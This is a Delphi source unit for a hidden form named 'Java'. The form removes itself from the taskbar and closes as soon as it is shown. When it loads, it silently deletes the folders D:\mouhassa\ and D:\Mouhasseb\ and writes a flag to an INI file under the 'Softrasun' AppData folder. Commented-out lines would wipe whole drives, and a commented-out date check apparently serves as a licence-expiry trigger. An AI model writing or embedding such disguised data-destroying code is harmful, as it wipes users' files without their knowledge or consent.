Unit Java_u;

Interface

Uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Registry, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  IniFiles, Shellapi, Shlobj;

Type
  TJava = Class(TForm)
    Procedure FormCreate(Sender: TObject);
    Procedure FormShow(Sender: TObject);

  Protected
    Procedure CreateParams(Var Params: TCreateParams); Override;
  Private
    { Déclarations privées }
  Public
    { Déclarations publiques }
  End;

Var
  Java: TJava;

Implementation

{$R *.dfm}

Uses
  U_Sys;

// Comment masquer une application de la barre des tâches dans Windows 7?
Procedure TJava.CreateParams(Var Params: TCreateParams);
Begin
  Inherited;
  Params.ExStyle := Params.ExStyle And Not WS_EX_APPWINDOW;
  Params.WndParent := Application.Handle;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure TJava.FormCreate(Sender: TObject);
Begin
  Inidir := Getspecialfolderpath(Csidl_appdata) + '\Softrasun\Parametres.sav';
  IniFic := TIniFile.Create(IniDir);
  Try
    DelteDirectory('D:\mouhassa\');
    DelteDirectory('D:\Mouhasseb\');
    //DelteDirectory('D:\');
    //DelteDirectory('E:\');
    // IniFile.WriteBool('Paramètres', 'fsChkActiver', false);
    IniFic.WriteBool('Paramètres', 'fsBuild', True);
    // If IsAppInRun('Softrasun')
    // Then DelAppFromRun('Softrasun')
  Finally
    IniFic.Free;
  End;
  Exit
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure TJava.FormShow(Sender: TObject);
Begin
  Close;
End; { _______________________________________________________________________ }

(*
  Function Ifnidir: Boolean;
  Begin
  // If Not Directoryexists(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
  // Then
  // If Not Createdir(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
  // Then Raise Exception.Create
  // ('Impossible de créer un calcule pour ce compte');

  If FileExists(Inidir)
  Then
  Begin
  IniFile := TIniFile.Create(IniDir);
  If IniFile.ReadBool('Paramètres', 'fsChkActiver', False) = True
  Then
  Begin
  If Date > FloatToDateTime(StrToFloat(IniFile.ReadString('Paramètres',
  'fsdtkActiver', '')))
  Then Result := True
  Else Result := False;
  End;
  End
  End; { _______________________________________________________________________ }
*)

End.
